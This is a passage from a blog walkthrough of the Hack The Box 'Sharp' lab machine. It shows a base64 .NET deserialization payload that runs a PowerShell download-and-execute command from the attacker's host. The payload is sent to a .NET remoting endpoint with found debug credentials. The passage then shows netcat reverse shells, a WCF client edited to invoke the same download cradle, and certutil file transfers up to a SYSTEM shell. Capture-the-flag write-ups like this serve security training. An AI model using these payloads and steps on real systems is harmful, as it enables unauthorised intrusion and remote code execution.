class="line">AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAGsvYyBwb3dlcnNoZWxsIC1jIElFWChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuNS9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEnKQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL</span><br /></pre><p>Now we need to use the exploit we found and use the seralized payload</p><pre><span class="line">ExploitRemotingService.exe -s --user=debug --pass=<span class="string">"SharpApplicationDebugUserPassword123!"</span> tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAGsvYyBwb3dlcnNoZWxsIC1jIElFWChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuNS9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEnKQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL</span><br /></pre><p>It will gives you an error ignore it and check your netcat</p><pre><span class="line">D:\SEALED\Sharp&gt;nc.exe -lvp 9001</span><br /><span class="line">listening on [any] 4321 ...</span><br /><span class="line">Windows PowerShell running as user lars on SHARP</span><br /><span class="line">Copyright (C) 2015 Microsoft Corporation. All rights reserved.</span><br /><span class="line"></span><br /><span class="line">PS C:\Windows\system32&gt;whoami</span><br /><span class="line">sharp\lars</span><br /><span class="line">PS C:\Windows\system32&gt; net user</span><br /><span class="line"></span><br /><span class="line">User accounts <span class="keyword">for</span> \\SHARP</span><br /><span class="line"></span><br /><span class="line">-------------------------------------------------------------------------------</span><br /><span class="line">Administrator            debug                    DefaultAccount</span><br /><span class="line">Guest                    lars                     WDAGUtilityAccount</span><br /><span class="line">The <span class="built_in">command</span> completed successfully.</span><br /></pre><p>1st flag is collected</p><pre><span class="line">PS C:\users\lars\desktop&gt; dir</span><br /><span class="line"></span><br /><span class="line"></span><br /><span class="line">    Directory: C:\users\lars\desktop</span><br /><span class="line"></span><br /><span class="line"></span><br /><span class="line">Mode                LastWriteTime         Length Name</span><br /><span class="line">----                -------------         ------ ----</span><br /><span class="line">-ar---         1/7/2021   2:17 PM             34 user.txt</span><br /><span class="line"></span><br /><span class="line"></span><br /><span class="line">PS C:\users\lars\desktop&gt; <span class="built_in">type</span> user.txt</span><br /><span class="line">q5e84wq8e4qw8f4dw8f4sdf</span><br /></pre><p>After enumerating and that took a lot of time i found dir called WCF and that's a windows service</p><pre><span class="line">PS C:\users\lars\documents\wcf&gt; dir</span><br /><span class="line"></span><br /><span class="line"></span><br /><span class="line">    Directory: C:\users\lars\documents\wcf</span><br /><span class="line"></span><br /><span class="line"></span><br /><span class="line">Mode                LastWriteTime         Length Name                                                                 </span><br /><span class="line">----                -------------         ------ ----                                                                 </span><br /><span class="line">d-----       11/15/2020   1:40 PM                .vs                                                                  </span><br /><span class="line">d-----       11/15/2020   1:40 PM                Client                                                               </span><br /><span class="line">d-----       11/15/2020   1:40 PM                packages                                                             </span><br /><span class="line">d-----       11/15/2020   1:40 PM                RemotingLibrary                                                      </span><br /><span class="line">d-----       11/15/2020   1:41 PM                Server                                                               </span><br /><span class="line">-a----       11/15/2020  12:47 PM           2095 wcf.sln</span><br /></pre><p>I compressed it and moved it to dev dir so i can mount it to get the file</p><pre><span class="line">PS C:\users\lars\documents&gt; dir</span><br /><span class="line"></span><br /><span class="line"></span><br /><span class="line">    Directory: C:\users\lars\documents</span><br /><span class="line"></span><br /><span class="line"></span><br /><span class="line">Mode                LastWriteTime         Length Name                                                                 </span><br /><span class="line">----                -------------         ------ ----                                                                 </span><br /><span class="line">d-----       11/15/2020   1:40 PM                wcf                                                                  </span><br /><span class="line"></span><br /><span class="line"></span><br /><span class="line">PS C:\users\lars\documents&gt; Compress-Archive -LiteralPath C:\users\lars\Documents\wcf -DestinationPath C:\users\lars\Documents\wcf.zip</span><br /><span class="line">PS C:\users\lars\documents&gt; dir</span><br /><span class="line"></span><br /><span class="line"></span><br /><span class="line">    Directory: C:\users\lars\documents</span><br /><span class="line"></span><br /><span class="line"></span><br /><span class="line">Mode                LastWriteTime         Length Name                                                                 </span><br /><span class="line">----                -------------         ------ ----                                                                 </span><br /><span class="line">d-----       11/15/2020   1:40 PM                wcf                                                                  </span><br /><span class="line">-a----         1/9/2021   6:09 PM       11598452 wcf.zip</span><br /></pre><p>Moving the compressed file</p><pre><span class="line">move-item -path C:\users\lars\Documents\wcf.zip -destination c:\dev</span><br /></pre><p>Mounting dev dir</p><pre><span class="line">C:\Users\Administrator&gt;net use X: \\10.10.10.219\dev</span><br /></pre><h1>Exploiting WCF</h1><p>There is an exe file so let's De-compile it with Dnspy like we did before</p><p><img data-proofer-ignore data-src="https://i.ibb.co/bdkbjc2/2021-05-01-22-13-16.png" alt="2021-05-01-22-13-16" border="0" /></p><p>Let's check what the main function contains</p><p><img data-proofer-ignore data-src="https://i.ibb.co/Pz8c5rp/2021-05-01-22-15-55.png" alt="2021-05-01-22-15-55" border="0" /></p><p>It's connecting to port 8889, WCF is a windows service so it should be running as a privileged user</p><p>Now we need to edit the code to get our reverse shell</p><pre><span class="line">Console.WriteLine(wcfService.InvokePowerShell(<span class="string">"iex (new-object net.webclient).downloadstring('http://10.10.x.x/Invoke-PowerShellTcp.ps1')"</span>));</span><br /></pre><p><img data-proofer-ignore data-src="https://i.ibb.co/mXF9CSw/htb153.jpg" alt="htb153" border="0" /></p><p>Now we need to tranfser the exe and the dll library to victim machine to get our reverse shell</p><pre><span class="line">PS C:\users\lars\documents&gt; certutil -urlcache -split -f <span class="string">"http://10.10.xx.x/WcfRemotingLibrary.dll"</span> WcfRemotingLibrary.dll</span><br /><span class="line">****  Online  ****</span><br /><span class="line">  0000  ...</span><br /><span class="line">  1e00</span><br /><span class="line">CertUtil: -URLCache <span class="built_in">command</span> completed successfully.</span><br /><span class="line">PS C:\users\lars\documents&gt; certutil -urlcache -split -f <span class="string">"http://10.10.xx.x/WcfClient.exe"</span> WcfClient.exe</span><br /><span class="line">****  Online  ****</span><br /><span class="line">  0000  ...</span><br /><span class="line">  1400</span><br /><span class="line">CertUtil: -URLCache <span class="built_in">command</span> completed successfully.</span><br /><span class="line">PS C:\users\lars\documents&gt; dir</span><br /><span class="line"></span><br /><span class="line"></span><br /><span class="line">    Directory: C:\users\lars\documents</span><br /><span class="line"></span><br /><span class="line"></span><br /><span class="line">Mode                LastWriteTime         Length Name</span><br /><span class="line">----                -------------         ------ ----</span><br /><span class="line">d-----       11/15/2020   1:40 PM                wcf</span><br /><span class="line">-a----         1/9/2021   6:51 PM           5120 WcfClient.exe</span><br /><span class="line">-a----         1/9/2021   6:50 PM           7680 WcfRemotingLibrary.dll</span><br /></pre><h1>Root</h1><p>Execute the WCFclient.exe to get the reverse shell</p><p><span class="line">PS C:\users\lars\documents&gt; .\WcfClient.exe</span></p><p>Check your netcat now !</p><pre><span class="line">D:\SEALED\Sharp&gt;nc.exe -lvp 4322</span><br /><span class="line">listening on [any] 4322 ...</span><br /><span class="line">connect to [10.10.xx.xx] from DESKTOP-9LSPC40 [10.10.10.219] 49692</span><br /><span class="line">Windows PowerShell running as user SHARP$ on SHARP</span><br /><span class="line">Copyright (C) 2015 Microsoft Corporation. All rights reserved.</span><br /><span class="line"></span><br /><span class="line">PS C:\Windows\system32&gt;whoami</span><br /><span class="line">nt authority\system</span><br /><span class="line">PS C:\Windows\system32&gt; <span class="built_in">cd</span> /users/administrator/desktop</span><br /><span class="line">PS C:\users\administrator\desktop&gt; dir</span><br /><span class="line"></span><br /><span class="line"></span><br /><span class="line">    Directory: C:\users\administrator\desktop</span><br /><span class="line"></span><br /><span class="line"></span><br /><span class="line">Mode                LastWriteTime         Length Name                                                                   </span><br /><span class="line">----                -------------         ------ ----                                                                   </span><br /><span class="line">-ar---         1/7/2021   2:17 PM             34 root.txt                                                               </span><br /><span class="line"></span><br /><span class="line"></span><br /><span class="line">PS C:\users\administrator\desktop&gt; cat root.txt</span><br /><span class="line">asda4as49d5as9d59as2d9as2dasds</span><br /></pre><p>Thanks for reading i hope you enjoyed.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Sharp walkthrough - m19o&url=https://m19o.github.io/posts/HackTheBox-Sharp-Walkthrough/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Sharp walkthrough - m19o&u=https://m19o.github.io/posts/HackTheBox-Sharp-Walkthrough/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Sharp walkthrough - m19o&url=https://m19o.github.io/posts/HackTheBox-Sharp-Walkthrough/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://m19o.github.io/posts/HackTheBox-Sharp-Walkthrough/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Hackthebox-Anubis-Walkthrough/">Hackthebox Anubis walkthrough</a><li><a href="/posts/How-i-found-my-first-0day/">How i found my first 0day</a><li><a href="/posts/HackTheBox-Sharp-Walkthrough/">Hackthebox Sharp walkthrough</a><li><a href="/posts/HackTheBox-Schooled-Walkthrough/">Hackthebox Schooled walkthrough</a><li><a href="/posts/HackTheBox-BreadCrumbs-Walkthrough/">Hackthebox BreadCrumbs walkthrough</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/publications/">Publications</a> <a class="post-tag" href="/tags/securityresearching/">SecurityResearching</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HackTheBox-Traceback-Walkthrough/"><div class="card-body"> <span class="timeago small" >Nov 25, 2021<i class="unloaded">2021-11-25T22:24:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Tracback walkthrough</h3><div class="text-muted small"><p> Enumeration ِWe will use NMAP for enumeration phase, So let`s GO !. ِSo NMAP found that port 22 and port 80 are open. Let`s Check port 80. ِOuch! look like someone was here befor...</p></div></div></a></div><div class="card"> <a href="/posts/Hackthebox-Buff-Walkthrough/"><div class="card-body"> <span class="timeago small" >Nov 26, 2021<i class="unloaded">2021-11-26T01:27:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Buff walkthrough</h3><div class="text-muted small"><p> Enumeration ِLet`s begain scanning with NMAP ِTwo ports are open 8080 , 7680 ِAfter opening the webapp at 8080 i found out it`s from ProjectWorld.in And i searched for the project http...</p></div></div></a></div><div class="card"> <a href="/posts/Hack-the-box-jewel-walkthrough/"><div class="card-body"> <span class="timeago small" >Nov 26, 2021<i class="unloaded">2021-11-26T01:29:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox jewel walkthrough</h3><div class="text-muted small"><p> Scanning We found port 22 for ssh and port 8000,8080 for HTTP where port 8000 Let`s add jewel.htb in our hosts Enumeration Port 8000 port 8080 Let`s enumerate the BLOG! We found 2 user...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HackTheBox-Schooled-Walkthrough/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Schooled walkthrough</p></a> <a href="/posts/Hackthebox-Tabby-walkthrough/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Tabby walkthrough</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/m19o__">Mohamed Magdy Abumuslim</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/publications/">Publications</a> <a class="post-tag" href="/tags/securityresearching/">SecurityResearching</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
